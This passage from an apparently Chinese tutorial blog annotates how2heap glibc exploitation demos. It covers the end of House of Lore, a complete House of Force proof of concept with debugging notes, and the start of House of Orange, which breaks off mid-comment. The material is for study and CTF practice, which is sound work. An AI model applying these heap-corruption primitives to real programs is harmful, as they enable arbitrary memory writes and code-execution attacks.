现在我们分配一个和我们第一次free大小一样的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这个操作将会给我们返回已经被覆写的victim chunk并且将bin-&gt;bk指向被注入的victim-&gt;bk指针  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个最后一次的malloc将欺骗glibc malloc返回一个在bin-&gt;bk中被注入的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 而stack_buffer_2的fwd指针也在最后一次的malloc中被修改了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-11"><a href="#运行结果及调试-11" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>现在malloc了victim和申请了两个变量</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13538704706/0" alt="image-20210518133327151"></p>
<p>然后修改了stack_buffer_1的值</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13538706340/0" alt="image-20210518133401242"></p>
<p>第二次修改</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13538707201/0" alt="image-20210518133423762"></p>
<p>现在分配p5来避免free victim的时候被合并到top chunk中</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13538708409/0" alt="image-20210518133449918"></p>
<p>接着我们free掉victim，它就会被放入fastbin中</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13538723461/0" alt="image-20210518133848039"></p>
<p>此时我们malloc一个超大的chunk，我们的victim就会被放入small bin中，这里其实就是发生了malloc_conslidate</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13538728910/0" alt="image-20210518134030220"></p>
<p>现在我们修改victim的bk指针，使其指向栈上</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13538742110/0" alt="image-20210518134521708"></p>
<p>现在我们再申请一个victim一样大小的chunk，因为small bin是FIFO，所以头会先取出</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13539172103/0" alt="image-20210518153352548"></p>
<p>现在我们再申请一个chunk就能申请到栈上了</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13539177625/0" alt="image-20210518153452322"></p>
<h2 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h2><p>程序首先在栈上定义了两个变量,stack_buffer_1[4],stack_buffer_2[3]</p>
<p>随后在栈上创建了一个fake chunk,将stack_buffer_1的fwd指针指向了victim_chunk</p>
<p>随后将stack_buffere_1的bk指针指向了stack_buffer_2,将stack_buffer_2的fwd指针指向了stack_buffer_1来绕过检查</p>
<p>之后为了将我们的victim放进我们的small bin中,申请一个超大的chunk</p>
<p>在victim被放进了small bin后,我们只需要覆盖victim的bk指针指向我们的stack_buffer_1即可</p>
<p>现在我们再分配一个大小为100的chunk,系统就会把victim返回给我们,但此时small bin中还有我们依旧伪造好的fake chunk</p>
<p>此时再分配就可以将我们的fake chunk拿出来了</p>
<p>条件：</p>
<ol>
<li>能够控制small bin中的bk指针</li>
</ol>
<p>感觉这种是不是换成unsorted bin是不是也行？我猜的</p>
<h1 id="0x13-house-of-force"><a href="#0x13-house-of-force" class="headerlink" title="0x13 house of force"></a>0x13 house of force</h1><p>利用一个巨大的size来改写top chunk的size</p>
<h2 id="源代码-13"><a href="#源代码-13" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bss_var是我们要覆写的string</span></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// House of Force是覆写top chunk来分配任意内存地址的攻击方法</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// top chunk是一个特殊的chunk,是内存中最后一块chunk,在向系统申请更多空间的情况下将会更改size的大小</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line">		<span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//在最后,我们将会使用这个方法来覆写bss_var的值</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先分配一个chunk p1(256)</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在堆由两个chunk组成,一个是我们分配的,另一个就是top chunk</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以覆盖top chunk的大小</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用一个超大的值来覆盖top chunk以让我们可以确保malloc永远不会调用mmap来申请空间</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">	*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">	<span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们的top chunk的size巨大非凡,我们可以随意申请内存而不会调用mmap</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">   <span class="comment">// 下面,我们将通过整数溢出分配一个直达我们所需区域的,之后就可以在我们所需区域处分配一个chunk出来</span></span><br><span class="line">	   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	我们所需的size是这么计算的:</span></span><br><span class="line"><span class="comment">     nb是我们要求的size+元数据</span></span><br><span class="line"><span class="comment">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">	 * new_top = old_top + nb</span></span><br><span class="line"><span class="comment">	 * nb = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line">	<span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">    <span class="comment">// 按预期,新的指针和旧的top chuk在同一位置</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="comment">// 现在,我们覆写的下一个chunk将指向我们的目标buffer</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line">    <span class="comment">// 现在,我们终于可以覆写这个值啦!</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// some further discussion:</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line">	<span class="comment">//	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line">	<span class="comment">//	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-12"><a href="#运行结果及调试-12" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先申请了p1</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13539237307/0" alt="image-20210518154759704"></p>
<p>此时我们修改我们top chunk的size为-1</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13539243039/0" alt="image-20210518154926372"></p>
<p>此时因为top chunk的size巨大无比，所以无论我们申请多少的空间，他都不会再调用mmap了</p>
<p>现在我们计算evil_size的大小</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13539373867/0" alt="image-20210518161628202"></p>
<p>然后我们申请一个evil_size大小的chunk</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13539394391/0" alt="image-20210518162025441"></p>
<p>现在我们新申请的chunk是从之前的top chunk起始的，此时我们再申请一个chunk就可以拿到我们想要申请的地址了</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13539576432/0" alt="image-20210518165600310"></p>
<p>程序首先建立了一个全局变量bss_var,也就是我们需要攻击的地方</p>
<p>随后分配了chunk p1(256),现在我们的top chunk的size是一个比较小的值</p>
<p>因此我们假设有一个漏洞可以覆写top chunk的size,我们通过写入-1来使size变为一个巨大的数(0xffffffffffffffff)</p>
<p>此时无论我们再申请多大的空间,ptmalloc都不会再向系统申请调用mmap了(当然..如果把0xfffffffffffffff的空间都用完了还是会申请的</p>
<p>现在我们计算出了evil_size所需的值,也就是</p>
<p>evil_size=(bss_var-16)-(ptr_top)-16</p>
<p>此时我们先申请一个大小为evil_size的chunk,此时新指针和旧的top chunk在同一位置,而size正好是旧top chunk到我们bss_var的差值</p>
<p>此时我们再申请一块chunk就可以获得我们想控制的var_bss了。</p>
<h1 id="0x14-house-of-orange"><a href="#0x14-house-of-orange" class="headerlink" title="0x14 house of orange"></a>0x14 house of orange</h1><p>house of orange来自angelboy在hitcon 2016上出的一道题目,这个攻击方法并不单指本文所说的,而是指关于其一系列的伴生题目的漏洞利用技巧</p>
<p>其最主要的原理就是在没有free的情况下如何产生一个free状态的bins和io_file的利用</p>
<p>但最最最主要的利用是io_file的利用</p>
<h2 id="源代码-14"><a href="#源代码-14" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      // house of orange开始于一个在堆上有一个可以破坏top chunk的缓冲区溢出漏洞的假设</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      // 在执行前,整个heap都是top chunk的一部分</span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      // 通常来说,第一次申请内存的时候会从top chunk中切出一部分来处理请求</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      // 然后,随着我们不停的分配top chunk,top chunk会变得越来越小</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      // 而在我们所申请的size比top chunk更大时会有两件事情发生</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">      // 1.拓展top chunk,mmap一个新页</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在2.26的更改中,程序不在调用_IO_flush_all_lockp的malloc_printer的行为移除了我们攻击的媒介</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 由于对glibc 2.24 中 _IO_FILE vtable进行了白名单检查,因此这种攻击手段得到了抑制</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it 